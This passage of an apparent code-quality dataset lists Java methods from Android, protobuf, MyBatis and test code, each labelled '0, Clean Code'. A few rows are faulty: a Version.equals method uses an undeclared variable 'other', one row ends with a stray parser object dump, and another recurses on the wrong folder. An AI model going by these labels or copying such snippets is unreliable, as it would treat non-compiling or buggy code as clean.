    StringBuilder sb=new StringBuilder();
    sb.append(""Exception message - "").append(throwable.getMessage()).append("", Method name - "").append(method.getName());
    if (ArrayUtil.isNotEmpty(objects)) {
      sb.append("", Parameter value - "").append(Arrays.toString(objects));
    }
    throw new ServiceException(sb.toString());
  }
;
}
",0,Clean Code
"@Test void should_retrieve_with_custom_dynamicMinScore_builder(){
  ContentRetriever contentRetriever=EmbeddingStoreContentRetriever.builder().embeddingStore(EMBEDDING_STORE).embeddingModel(EMBEDDING_MODEL).dynamicMinScore((query) -> CUSTOM_MIN_SCORE).build();
  contentRetriever.retrieve(QUERY);
  verify(EMBEDDING_STORE).search(EmbeddingSearchRequest.builder().queryEmbedding(EMBEDDING).maxResults(DEFAULT_MAX_RESULTS).minScore(CUSTOM_MIN_SCORE).build());
  verifyNoMoreInteractions(EMBEDDING_STORE);
}
",0,Clean Code
"@SneakyThrows private static void importDbeaverConfig(File resource,Element resourceElement,String containerPath,ZipFile zipFile){
  for (  Element childElement : XMLUtils.getChildElementList(resourceElement,ExportConstants.TAG_RESOURCE)) {
    String childName=childElement.getAttribute(ExportConstants.ATTR_NAME);
    String entryPath=containerPath + childName;
    ZipEntry resourceEntry=zipFile.getEntry(entryPath);
    if (resourceEntry == null) {
      continue;
    }
    boolean isDirectory=resourceEntry.isDirectory();
    if (isDirectory) {
      File folder=new File(resource.getPath());
      if (!folder.exists()) {
        FileUtil.mkdir(folder);
      }
      importDbeaverConfig(folder,childElement,entryPath + ""/"",zipFile);
    }
 else {
      File file=new File(resource.getPath() + File.separator + childName);
      FileUtil.writeFromStream(zipFile.getInputStream(resourceEntry),file,true);
    }
  }
}
",0,Clean Code
"/** 
 * Tells if this version is equal to  {@code obj} according to semantic versioning rules. 
 */
@Override public boolean equals(Object obj){
  if (this == obj)   return true;
  if (!(obj instanceof Version))   return false;
  return major == other.major && minor == other.minor && patch == other.patch && Objects.equals(preRelease,other.preRelease);
}
",0,Clean Code
"@Bean @ConditionalOnMissingBean public SqlSessionFactory sqlSessionFactory(DataSource dataSource) throws Exception {
  SqlSessionFactoryBean factory=new FlexSqlSessionFactoryBean();
  factory.setDataSource(dataSource);
  if (properties.getConfiguration() == null || properties.getConfiguration().getVfsImpl() == null) {
    factory.setVfs(SpringBootVFS.class);
  }
  if (StringUtils.hasText(this.properties.getConfigLocation())) {
    factory.setConfigLocation(this.resourceLoader.getResource(this.properties.getConfigLocation()));
  }
  applyConfiguration(factory);
  if (this.properties.getConfigurationProperties() != null) {
    factory.setConfigurationProperties(this.properties.getConfigurationProperties());
  }
  if (!ObjectUtils.isEmpty(this.interceptors)) {
    factory.setPlugins(this.interceptors);
  }
  if (this.databaseIdProvider != null) {
    factory.setDatabaseIdProvider(this.databaseIdProvider);
  }
  if (StringUtils.hasLength(this.properties.getTypeAliasesPackage())) {
    factory.setTypeAliasesPackage(this.properties.getTypeAliasesPackage());
  }
  if (this.properties.getTypeAliasesSuperType() != null) {
    factory.setTypeAliasesSuperType(this.properties.getTypeAliasesSuperType());
  }
  if (StringUtils.hasLength(this.properties.getTypeHandlersPackage())) {
    factory.setTypeHandlersPackage(this.properties.getTypeHandlersPackage());
  }
  if (!ObjectUtils.isEmpty(this.typeHandlers)) {
    factory.setTypeHandlers(this.typeHandlers);
  }
  Resource[] mapperLocations=this.properties.resolveMapperLocations();
  if (!ObjectUtils.isEmpty(mapperLocations)) {
    factory.setMapperLocations(mapperLocations);
  }
  Set<String> factoryPropertyNames=Stream.of(new BeanWrapperImpl(SqlSessionFactoryBean.class).getPropertyDescriptors()).map(PropertyDescriptor::getName).collect(Collectors.toSet());
  Class<? extends LanguageDriver> defaultLanguageDriver=this.properties.getDefaultScriptingLanguageDriver();
  if (factoryPropertyNames.contains(""scriptingLanguageDrivers"") && !ObjectUtils.isEmpty(this.languageDrivers)) {
    factory.setScriptingLanguageDrivers(this.languageDrivers);
    if (defaultLanguageDriver == null && this.languageDrivers.length == 1) {
      defaultLanguageDriver=this.languageDrivers[0].getClass();
    }
  }
  if (factoryPropertyNames.contains(""defaultScriptingLanguageDriver"")) {
    factory.setDefaultScriptingLanguageDriver(defaultLanguageDriver);
  }
  applySqlSessionFactoryBeanCustomizers(factory);
  return factory.getObject();
}",0,Clean Code
"private boolean findClickableView(FrameLayout windowView,float x,float y,boolean swipeToDissmiss){
  if (windowView == null) {
    return false;
  }
  if (isPopupVisible) {
    return true;
  }
  if (selfStoryViewsView != null && selfStoriesViewsOffset != 0) {
    return true;
  }
  final PeerStoriesView currentPeerView=storiesViewPager.getCurrentPeerView();
  if (currentPeerView != null) {
    float x1=x - containerView.getX() - storiesViewPager.getX()- currentPeerView.getX();
    float y1=y - containerView.getY() - storiesViewPager.getY()- currentPeerView.getY();
    if (currentPeerView.findClickableView(currentPeerView,x1,y1,swipeToDissmiss)) {
      return true;
    }
    if (currentPeerView.keyboardVisible) {
      return false;
    }
  }
  if (swipeToDissmiss) {
    return false;
  }
  if (currentPeerView != null && currentPeerView.chatActivityEnterView != null && currentPeerView.chatActivityEnterView.getVisibility() == View.VISIBLE && y > containerView.getY() + storiesViewPager.getY() + currentPeerView.getY()+ currentPeerView.chatActivityEnterView.getY()) {
    return true;
  }
  if (currentPeerView != null && currentPeerView.chatActivityEnterView != null && currentPeerView.chatActivityEnterView.isRecordingAudioVideo()) {
    return true;
  }
  if (storiesIntro != null) {
    return true;
  }
  return AndroidUtilities.findClickableView(windowView,x,y,currentPeerView);
}",0,Clean Code
"@Override public void vertex(float x,float y,float z,float red,float green,float blue,float alpha,float u,float v,int overlay,int light,float normalX,float normalY,float normalZ){
  if (this.builder.sodium$hasDefaultColor()) {
    throw new IllegalStateException();
  }
  final long offset=MemoryUtil.memAddress(this.builder.sodium$getBuffer(),this.builder.sodium$getElementOffset());
  if (this.attributeOffsetPosition != ATTRIBUTE_NOT_PRESENT) {
    PositionAttribute.put(offset + this.attributeOffsetPosition,x,y,z);
  }
  if (this.attributeOffsetColor != ATTRIBUTE_NOT_PRESENT) {
    ColorAttribute.set(offset + this.attributeOffsetColor,ColorABGR.pack(red,green,blue,alpha));
  }
  if (this.attributeOffsetTexture != ATTRIBUTE_NOT_PRESENT) {
    TextureAttribute.put(offset + this.attributeOffsetTexture,u,v);
  }
  if (this.attributeOffsetOverlay != ATTRIBUTE_NOT_PRESENT) {
    OverlayAttribute.set(offset + this.attributeOffsetOverlay,overlay);
  }
  if (this.attributeOffsetLight != ATTRIBUTE_NOT_PRESENT) {
    LightAttribute.set(offset + this.attributeOffsetLight,light);
  }
  if (this.attributeOffsetNormal != ATTRIBUTE_NOT_PRESENT) {
    NormalAttribute.set(offset + this.attributeOffsetNormal,NormI8.pack(normalX,normalY,normalZ));
  }
  this.writtenAttributes=ATTRIBUTE_POSITION_BIT | ATTRIBUTE_COLOR_BIT | ATTRIBUTE_TEXTURE_BIT| ATTRIBUTE_OVERLAY_BIT| ATTRIBUTE_LIGHT_BIT| ATTRIBUTE_NORMAL_BIT;
  this.endVertex();
}
@Override public VertexConsumer vertex(double x,double y,double z){
  this.putPositionAttribute((float)x,(float)y,(float)z);
  return this;
}",0,Clean Code
"int getChannelType();
",0,Clean Code
"@java.lang.Override public int hashCode(){
  if (memoizedHashCode != 0) {
    return memoizedHashCode;
  }
  int hash=41;
  hash=(19 * hash) + getDescriptor().hashCode();
  if (hasMetadata()) {
    hash=(37 * hash) + METADATA_FIELD_NUMBER;
    hash=(53 * hash) + getMetadata().hashCode();
  }
  if (getVectorsCount() > 0) {
    hash=(37 * hash) + VECTORS_FIELD_NUMBER;
    hash=(53 * hash) + getVectorsList().hashCode();
  }
  if (getOutputsCount() > 0) {
    hash=(37 * hash) + OUTPUTS_FIELD_NUMBER;
    hash=(53 * hash) + getOutputsList().hashCode();
  }
  hash=(37 * hash) + K_FIELD_NUMBER;
  hash=(53 * hash) + getK();
  if (hasDistance()) {
    hash=(37 * hash) + DISTANCE_FIELD_NUMBER;
    hash=(53 * hash) + getDistance().hashCode();
  }
  hash=(37 * hash) + NUM_THREADS_FIELD_NUMBER;
  hash=(53 * hash) + getNumThreads();
  hash=(37 * hash) + PARALLEL_BACKEND_FIELD_NUMBER;
  hash=(53 * hash) + getParallelBackend().hashCode();
  if (hasCombiner()) {
    hash=(37 * hash) + COMBINER_FIELD_NUMBER;
    hash=(53 * hash) + getCombiner().hashCode();
  }
  if (hasNeighboursQueryFactory()) {
    hash=(37 * hash) + NEIGHBOURS_QUERY_FACTORY_FIELD_NUMBER;
    hash=(53 * hash) + getNeighboursQueryFactory().hashCode();
  }
  hash=(29 * hash) + unknownFields.hashCode();
  memoizedHashCode=hash;
  return hash;
}",0,Clean Code
"@Override public FileWrapper getFileWrapper(Object source,String name,String contentType,Long size) throws IOException {
  if (source instanceof UriFileWrapper) {
    return updateFileWrapper((UriFileWrapper)source,name,contentType,size);
  }
  URL url;
  if (source instanceof URI) {
    url=((URI)source).toURL();
  }
 else   if (source instanceof String) {
    url=URLUtil.url((String)source);
  }
 else {
    url=(URL)source;
  }
  URLConnection conn=url.openConnection();
  InputStream inputStream=IoUtil.toMarkSupportStream(conn.getInputStream());
  if (name == null)   name=getName(conn,url);
  if (size == null) {
    size=conn.getContentLengthLong();
    if (size < 0)     size=null;
  }
  UriFileWrapper wrapper=new UriFileWrapper(inputStream,name,contentType,size);
  if (contentType == null) {
    wrapper.getInputStreamMaskReset(in -> wrapper.setContentType(contentTypeDetect.detect(in,wrapper.getName())));
  }
  return wrapper;
}",0,Clean Code
"public static void isNull(Object object,String message){
  if (object != null) {
    throw new IllegalArgumentException(message);
  }
}
public static void isNull(Object object){
  isNull(object,""[Assertion failed] - the object argument must be null"");
}
",0,Clean Code
"@Override public SceneCastSkillScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  attackedGroupId=0;
  retcode=0;
  battleInfo.clear();
  return this;
}",0,Clean Code
"private static String[] makeLiteralNames(){
  return new String[]{null,null,""'.'"",""','"",""'['"",""']'"",""'('"",""')'"",""'=='"",""'-'"",""'+'"",""'>'"",""'>='"",""'<'"",""'<='"",""'!='""};
}
",0,Clean Code
"@Override protected int getLayer(final Graph2D graph,final Edge edge){
  return 2;
}
@Override protected int getLayer(final Graph2D graph,final Node node){
  final boolean isGroupNode=graph.getRealizer(node) instanceof ZyGroupNodeRealizer<?>;
  if ((graph.isSelected(node) || isAnyParentNodeSelected(node)) && !isGroupNode) {
    return 3;
  }
 else   if ((m_node == node) && !isGroupNode) {
    return 4;
  }
 else   if (isGroupNode) {
    return 1;
  }
 else {
    return 2;
  }
}",0,Clean Code
"public GProRetentionChannelInfo(){
  this.serialVersionUID=1L;
  this.guildName="""";
  this.guildIcon="""";
  this.guildProfile="""";
  this.guildCover="""";
  this.joinSig="""";
  this.tagList=new ArrayList<>();
}
public GProRetentionChannelInfo(long j2,String str,String str2,String str3,String str4,String str5,ArrayList<GProRetentionChannelLabel> arrayList){
  this.serialVersionUID=1L;
  this.guildName="""";
  this.guildIcon="""";
  this.guildProfile="""";
  this.guildCover="""";
  this.joinSig="""";
  this.tagList=new ArrayList<>();
  this.guildId=j2;
  this.guildName=str;
  this.guildIcon=str2;
  this.guildProfile=str3;
  this.guildCover=str4;
  this.joinSig=str5;
  this.tagList=arrayList;
}",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @return The enum associated with the given numeric wire value, or null if unknown.
 */
public static MapInfoChestType forNumber(int value){
  return MapInfoChestTypeConverter.INSTANCE.forNumber(value);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5575a785",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  ImageReceiver imageReceiver=animatedEmojiDrawable != null ? animatedEmojiDrawable.getImageReceiver() : this.imageReceiver;
  if (imageReceiver == null) {
    return;
  }
  if (width != -1 && height != -1) {
    if (drawFromStart) {
      imageReceiver.setImageCoords(0,0,width,height);
      if (blurAllowed) {
        blurImageReceiver.setImageCoords(0,0,width,height);
      }
    }
 else {
      imageReceiver.setImageCoords((getWidth() - width) / 2,(getHeight() - height) / 2,width,height);
      if (blurAllowed) {
        blurImageReceiver.setImageCoords((getWidth() - width) / 2,(getHeight() - height) / 2,width,height);
      }
    }
  }
 else {
    imageReceiver.setImageCoords(0,0,getWidth(),getHeight());
    if (blurAllowed) {
      blurImageReceiver.setImageCoords(0,0,getWidth(),getHeight());
    }
  }
  imageReceiver.draw(canvas);
  if (blurAllowed) {
    blurImageReceiver.draw(canvas);
  }
}",0,Clean Code
"void cacheToken(String str,int i2,int i3,byte[] bArr);",0,Clean Code
"/** 
 * <code>optional int64 next_recover_time = 4;</code>
 * @return this
 */
public StaminaInfoScNotify clearNextRecoverTime(){
  bitField0_&=~0x00000001;
  nextRecoverTime=0L;
  return this;
}",0,Clean Code
"@Test public void Eviction_LFU(){
  final var maximumSize=2;
  final var cache=new CacheBuilder<String,String>().maximumSize(maximumSize).evictionAlgorithm(EvictionAlgorithm.LFU).fetchAlgorithm(FetchAlgorithm.WRITE_BACK).dataSource(writeBackDataSource).build();
  cache.get(PROFILE_MUMBAI_ENGINEER).toCompletableFuture().join();
  for (int i=0; i < maximumSize; i++) {
    cache.set(""key"" + i,""value"" + i).toCompletableFuture().join();
  }
  Assert.assertEquals(2,cache.getEventQueue().size());
  assert cache.getEventQueue().get(0) instanceof Load;
  assert cache.getEventQueue().get(1) instanceof Eviction;
  final var evictionEvent=(Eviction<String,String>)cache.getEventQueue().get(1);
  Assert.assertEquals(Eviction.Type.REPLACEMENT,evictionEvent.getType());
  Assert.assertEquals(""key0"",evictionEvent.getElement().getKey());
  for (int i=0; i < maximumSize; i++) {
    acceptWrite();
  }
  final var permutation=new ArrayList<Integer>();
  for (int i=0; i < maximumSize; i++) {
    permutation.add(i);
  }
  Collections.shuffle(permutation);
  for (  final int index : permutation) {
    for (int i=0; i <= index; i++) {
      cache.get(""key"" + index).toCompletableFuture().join();
    }
  }
  cache.getEventQueue().clear();
  for (int i=0; i < maximumSize; i++) {
    cache.set(""random"" + i,""random_value"").toCompletableFuture().join();
    acceptWrite();
    for (int j=0; j <= maximumSize; j++) {
      cache.get(""random"" + i).toCompletableFuture().join();
    }
    Assert.assertEquals(Eviction.class.getName(),cache.getEventQueue().get(i * 2).getClass().getName());
    Assert.assertEquals(Write.class.getName(),cache.getEventQueue().get(i * 2 + 1).getClass().getName());
    final var eviction=(Eviction<String,String>)cache.getEventQueue().get(i * 2);
    System.out.println(cache.getEventQueue().get(i));
    Assert.assertEquals(Eviction.Type.REPLACEMENT,eviction.getType());
    Assert.assertEquals(""key"" + i,eviction.getElement().getKey());
  }
}",0,Clean Code
"private void visit(PrestoJoin join){
  visit(join.getLeftTable());
  sb.append("" "");
  sb.append(join.getJoinType());
  sb.append("" "");
  if (join.getOuterType() != null) {
    sb.append(join.getOuterType());
  }
  sb.append("" JOIN "");
  visit(join.getRightTable());
  if (join.getOnCondition() != null) {
    sb.append("" ON "");
    visit(join.getOnCondition());
  }
}
private void visit(PrestoConstant constant){
  sb.append(constant.toString());
}
private void visit(PrestoAtTimeZoneOperator timeZoneOperator){
  visit(timeZoneOperator.getExpr());
  sb.append("" AT TIME ZONE "");
  sb.append(timeZoneOperator.getTimeZone());
}
private void visit(PrestoFunctionWithoutParenthesis prestoFunctionWithoutParenthesis){
  sb.append(prestoFunctionWithoutParenthesis.getExpr());
}
private void visit(PrestoSelect select){
  sb.append(""SELECT "");
  if (select.isDistinct()) {
    sb.append(""DISTINCT "");
  }
  visit(select.getFetchColumns());
  sb.append("" FROM "");
  visit(select.getFromList());
  if (!select.getFromList().isEmpty() && !select.getJoinList().isEmpty()) {
    sb.append("", "");
  }
  if (!select.getJoinList().isEmpty()) {
    visit(select.getJoinList());
  }
  if (select.getWhereClause() != null) {
    sb.append("" WHERE "");
    visit(select.getWhereClause());
  }
  if (!select.getGroupByExpressions().isEmpty()) {
    sb.append("" GROUP BY "");
    visit(select.getGroupByExpressions());
  }
  if (select.getHavingClause() != null) {
    sb.append("" HAVING "");
    visit(select.getHavingClause());
  }
  if (!select.getOrderByClauses().isEmpty()) {
    sb.append("" ORDER BY "");
    visit(select.getOrderByClauses());
  }
  if (select.getLimitClause() != null) {
    sb.append("" LIMIT "");
    visit(select.getLimitClause());
  }
  if (select.getOffsetClause() != null) {
    sb.append("" OFFSET "");
    visit(select.getOffsetClause());
  }
}
public void visit(PrestoCastFunction cast){
  sb.append(""CAST(("");
  visit(cast.getExpr());
  sb.append("") AS "");
  sb.append(cast.getType().toString());
  sb.append("")"");
}
public void visit(PrestoMultiValuedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" (VALUES "");
  visit(comp.getRight());
  sb.append("")"");
  sb.append("")"");
}
public void visit(PrestoQuantifiedComparison comp){
  sb.append(""("");
  visit(comp.getLeft());
  sb.append("" "");
  sb.append(comp.getOp().getStringRepresentation());
  sb.append("" "");
  sb.append(comp.getType());
  sb.append("" ( "");
  visit(comp.getRight());
  sb.append("" ) "");
  sb.append("")"");
}
",0,Clean Code
"public static Info process(Node x){
  if (x == null) {
    return null;
  }
  Info leftInfo=process(x.left);
  Info rightInfo=process(x.right);
  int max=x.value;
  if (leftInfo != null) {
    max=Math.max(max,leftInfo.max);
  }
  if (rightInfo != null) {
    max=Math.max(max,rightInfo.max);
  }
  int min=x.value;
  if (leftInfo != null) {
    min=Math.min(min,leftInfo.min);
  }
  if (rightInfo != null) {
    min=Math.min(min,rightInfo.min);
  }
  boolean isBST=true;
  if (leftInfo != null && !leftInfo.isBST) {
    isBST=false;
  }
  if (rightInfo != null && !rightInfo.isBST) {
    isBST=false;
  }
  if (leftInfo != null && leftInfo.max >= x.value) {
    isBST=false;
  }
  if (rightInfo != null && rightInfo.min <= x.value) {
    isBST=false;
  }
  return new Info(isBST,max,min);
}
",0,Clean Code
"@Override public GetFarmStageGachaInfoScRsp clone(){
  return new GetFarmStageGachaInfoScRsp().copyFrom(this);
}
",0,Clean Code
"@Override public final int read(byte[] buffer,int offset,int readLength) throws IOException {
  Assertions.checkState(sourceOpened);
  while (true) {
    if (currentSegmentIndex == fakeData.getSegments().size() || bytesRemaining == 0) {
      return C.RESULT_END_OF_INPUT;
    }
    Segment current=fakeData.getSegments().get(currentSegmentIndex);
    if (current.isErrorSegment()) {
      if (!current.exceptionCleared) {
        current.exceptionThrown=true;
        throw (IOException)current.exception.fillInStackTrace();
      }
 else {
        currentSegmentIndex++;
      }
    }
 else     if (current.isActionSegment()) {
      currentSegmentIndex++;
      current.action.run();
    }
 else {
      readLength=(int)Math.min(readLength,bytesRemaining);
      readLength=Math.min(readLength,current.length - current.bytesRead);
      Assertions.checkArgument(buffer.length - offset >= readLength);
      if (current.data != null) {
        System.arraycopy(current.data,current.bytesRead,buffer,offset,readLength);
      }
      onDataRead(readLength);
      bytesTransferred(readLength);
      bytesRemaining-=readLength;
      current.bytesRead+=readLength;
      if (current.bytesRead == current.length) {
        currentSegmentIndex++;
      }
      return readLength;
    }
  }
}",0,Clean Code
"private void loadLastUnreadMention(){
}
",0,Clean Code
"@Override public boolean checkConfigKeyUnique(SysConfigEntity config){
  Long configId=StringUtils.isNull(config.getConfigId()) ? -1L : config.getConfigId();
  SysConfigEntity info=configMapper.checkConfigKeyUnique(config);
  if (StringUtils.isNotNull(info) && info.getConfigId().longValue() != configId.longValue()) {
    return false;
  }
  return true;
}",0,Clean Code
"/** 
 * Search for workflows based on payload
 * @param query the search query
 * @return the {@link SearchResult} containing the {@link WorkflowSummary} that match the query
 */
public SearchResult<WorkflowSummary> search(String query){
  return search(null,null,null,null,query);
}
/** 
 * Paginated search for workflows based on payload
 * @param start start value of page
 * @param size number of workflows to be returned
 * @param sort sort order
 * @param freeText additional free text query
 * @param query the search query
 * @return the {@link SearchResult} containing the {@link WorkflowSummary} that match the query
 */
public SearchResult<WorkflowSummary> search(@Nullable Integer start,@Nullable Integer size,@Nullable String sort,@Nullable String freeText,@Nullable String query){
  SearchPb.Request searchRequest=createSearchRequest(start,size,sort,freeText,query);
  WorkflowServicePb.WorkflowSummarySearchResult result=stub.search(searchRequest);
  return new SearchResult<>(result.getTotalHits(),result.getResultsList().stream().map(protoMapper::fromProto).collect(Collectors.toList()));
}
",0,Clean Code
"public GGProVoiceQueueCfg(GProVoiceQueueCfg gProVoiceQueueCfg){
  this.mInfo=gProVoiceQueueCfg;
}
",0,Clean Code
"OllamaDockerImageName(String baseImage,String localImageName){
  this.baseImage=baseImage;
  this.localImageName=localImageName;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.AdaGradRDADenseTensorProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.AdaGradRDADenseTensorProto other=(org.tribuo.math.protos.AdaGradRDADenseTensorProto)obj;
  if (hasData() != other.hasData())   return false;
  if (hasData()) {
    if (!getData().equals(other.getData()))     return false;
  }
  if (java.lang.Double.doubleToLongBits(getLearningRate()) != java.lang.Double.doubleToLongBits(other.getLearningRate()))   return false;
  if (java.lang.Double.doubleToLongBits(getEpsilon()) != java.lang.Double.doubleToLongBits(other.getEpsilon()))   return false;
  if (java.lang.Double.doubleToLongBits(getL1()) != java.lang.Double.doubleToLongBits(other.getL1()))   return false;
  if (java.lang.Double.doubleToLongBits(getL2()) != java.lang.Double.doubleToLongBits(other.getL2()))   return false;
  if (!getGradNorms().equals(other.getGradNorms()))   return false;
  if (getIteration() != other.getIteration())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}",0,Clean Code
"/** 
 * <code>repeated .Quest quest_list = 10;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<QuestOuterClass.Quest> getMutableQuestList(){
  bitField0_|=0x00000004;
  return questList;
}",0,Clean Code
"@Override public UnlockPhoneThemeScNotify clone(){
  return new UnlockPhoneThemeScNotify().copyFrom(this);
}
",0,Clean Code
"public ZyEdgeRealizer(final ZyLabelContent content,final IEdgeRealizerUpdater<EdgeType> updater){
  Preconditions.checkNotNull(content,""Internal Error: Content cannot be null"");
  m_content=content;
  setArrow(Arrow.STANDARD);
  setSmoothedBends(true);
  if (content.getLineCount() > 0) {
    addLabel(new ZyEdgeLabel(content));
  }
  setUpdater(updater);
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code RogueAchivedMiracleInfo}
 */
public static RogueAchivedMiracleInfo newInstance(){
  return new RogueAchivedMiracleInfo();
}
",0,Clean Code
"@Test public void test4(){
  MySqlCreateTableStatement x=new MySqlCreateTableStatement();
  x.setTableName(""ff"");
  x.setComment(new MySqlCharExpr(null));
  SQLColumnDefinition c=new SQLColumnDefinition();
  x.addColumn(c);
  c.setName(""name"");
  SQLDataTypeImpl sqlDataType=new SQLDataTypeImpl();
  sqlDataType.setName(""varchar(32)"");
  c.setDataType(sqlDataType);
  c.addConstraint(new SQLNotNullConstraint());
  c.setComment(new MySqlCharExpr(""xname""));
  log.info(x.toString());
}",0,Clean Code
"@Override public SyncDeleteFriendScNotify create(){
  return SyncDeleteFriendScNotify.newInstance();
}
",0,Clean Code
"@Override public ActionResult deleteWithPermission(Long id){
  DataSource dataSource=queryExistent(id,null).getData();
  PermissionUtils.checkOperationPermission(dataSource.getUserId());
  getMapper().deleteById(id);
  LambdaQueryWrapper<DataSourceAccessDO> dataSourceAccessQueryWrapper=new LambdaQueryWrapper<>();
  dataSourceAccessQueryWrapper.eq(DataSourceAccessDO::getDataSourceId,id);
  getAccessMapper().delete(dataSourceAccessQueryWrapper);
  return ActionResult.isSuccess();
}
",0,Clean Code
"public long getUserId(){
  return this.userId;
}
",0,Clean Code
"@Override public MemoryBuffer getBuffer(){
  return MemoryBuffer.this;
}
",0,Clean Code
"long getNextPos();
",0,Clean Code
"/** 
 * <code>repeated .ChessRogueItemInfo.ItemsEntry items = 4;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<ItemsEntry> getMutableItems(){
  bitField0_|=0x00000001;
  return items;
}",0,Clean Code
"public static DestroyItemCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),data).checkInitialized();
}
public static DestroyItemCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),input).checkInitialized();
}
public static DestroyItemCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DestroyItemCsReq(),input).checkInitialized();
}
",0,Clean Code
"@Override public String toString(){
  return ""QueryEmpInsuranceMonthVO{"" + ""employeeId="" + employeeId + "", employeeName='""+ employeeName+ '\''+ "", mobile='""+ mobile+ '\''+ "", entryTime=""+ entryTime+ "", deptName='""+ deptName+ '\''+ "", city='""+ city+ '\''+ "", schemeName='""+ schemeName+ '\''+ "", personalInsuranceAmount=""+ personalInsuranceAmount+ "", personalProvidentFundAmount=""+ personalProvidentFundAmount+ "", corporateInsuranceAmount=""+ corporateInsuranceAmount+ "", corporateProvidentFundAmount=""+ corporateProvidentFundAmount+ '}';
}
",0,Clean Code
"/** 
 * @return The model id.
 */
public String id(){
  return this.id;
}
",0,Clean Code
"private static H2DataType getColumnType(String columnType){
  if (columnType.startsWith(""INTEGER"") || columnType.startsWith(""SMALLINT"") || columnType.startsWith(""TINYINT"")|| columnType.startsWith(""BIGINT"")) {
    return H2DataType.INT;
  }
 else   if (columnType.startsWith(""BOOLEAN"")) {
    return H2DataType.BOOL;
  }
 else   if (columnType.startsWith(""CHARACTER VARYING"")) {
    return H2DataType.VARCHAR;
  }
 else   if (columnType.startsWith(""DOUBLE"") || columnType.startsWith(""DECFLOAT"") || columnType.startsWith(""REAL"")|| columnType.startsWith(""FLOAT"")) {
    return H2DataType.DOUBLE;
  }
 else   if (columnType.startsWith(""NUMERIC"")) {
    return H2DataType.INT;
  }
 else   if (columnType.contentEquals(""NULL"")) {
    return H2DataType.INT;
  }
 else   if (columnType.startsWith(""BINARY"")) {
    return H2DataType.BINARY;
  }
 else {
    throw new AssertionError(columnType);
  }
}",0,Clean Code
"private void handleToggle(int old_pos,boolean checked){
  AppDescriptor app=getItem(old_pos);
  String packageName=app.getPackageName();
  if (checked == mCheckedItems.contains(packageName))   return;
  if (checked)   mCheckedItems.add(packageName);
 else   mCheckedItems.remove(packageName);
  if (mListener != null)   mListener.onAppToggled(app,checked);
  List<AppDescriptor> apps=getApps();
  int new_pos=old_pos;
  for (int i=0; i < apps.size(); i++) {
    AppDescriptor other=apps.get(i);
    if ((i != old_pos) && compareCheckedFirst(app,other) <= 0) {
      new_pos=i;
      break;
    }
  }
  if (new_pos > old_pos)   new_pos--;
  Log.d(TAG,""Item @"" + old_pos + "": ""+ (checked ? ""checked"" : ""unchecked"")+ "" -> ""+ new_pos);
  notifyItemChanged(old_pos);
  if (new_pos != old_pos) {
    apps.remove(old_pos);
    apps.add(new_pos,app);
    notifyItemMoved(old_pos,new_pos);
    if (mRecyclerView != null) {
      if (checked)       mRecyclerView.scrollToPosition(new_pos);
 else       mRecyclerView.scrollToPosition(old_pos);
    }
  }
}",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.RealInfoProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.RealInfoProto other=(org.tribuo.protos.core.RealInfoProto)obj;
  if (!getName().equals(other.getName()))   return false;
  if (getCount() != other.getCount())   return false;
  if (java.lang.Double.doubleToLongBits(getMax()) != java.lang.Double.doubleToLongBits(other.getMax()))   return false;
  if (java.lang.Double.doubleToLongBits(getMin()) != java.lang.Double.doubleToLongBits(other.getMin()))   return false;
  if (java.lang.Double.doubleToLongBits(getMean()) != java.lang.Double.doubleToLongBits(other.getMean()))   return false;
  if (java.lang.Double.doubleToLongBits(getSumSquares()) != java.lang.Double.doubleToLongBits(other.getSumSquares()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"public void cancelUploadWallpaper(){
  if (uploadingWallpaperInfo != null) {
    if (uploadingWallpaperInfo.requestIds != null) {
      for (int i=0; i < uploadingWallpaperInfo.requestIds.size(); i++) {
        ConnectionsManager.getInstance(currentAccount).cancelRequest(uploadingWallpaperInfo.requestIds.get(i),true);
      }
    }
    FileLoader.getInstance(currentAccount).cancelFileUpload(uploadingWallpaper,false);
    if (uploadingWallpaperInfo.dialogId != 0) {
      if (uploadingWallpaperInfo.dialogId >= 0) {
        TLRPC.UserFull userFull=getUserFull(uploadingWallpaperInfo.dialogId);
        if (userFull != null) {
          userFull.wallpaper=uploadingWallpaperInfo.prevUserWallpaper;
          NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.userInfoDidLoad,uploadingWallpaperInfo.dialogId,userFull);
        }
      }
 else {
        TLRPC.ChatFull chatFull=getChatFull(-uploadingWallpaperInfo.dialogId);
        if (chatFull != null) {
          chatFull.wallpaper=uploadingWallpaperInfo.prevUserWallpaper;
          NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.chatInfoDidLoad,chatFull,0,false,false);
        }
      }
    }
    uploadingWallpaperInfo=null;
    uploadingWallpaper=null;
  }
}",0,Clean Code
"/** 
 * <code>optional string msg = 6;</code>
 * @return internal {@code Utf8String} representation of msg for modifications
 */
public Utf8String getMutableMsgBytes(){
  bitField0_|=0x00000020;
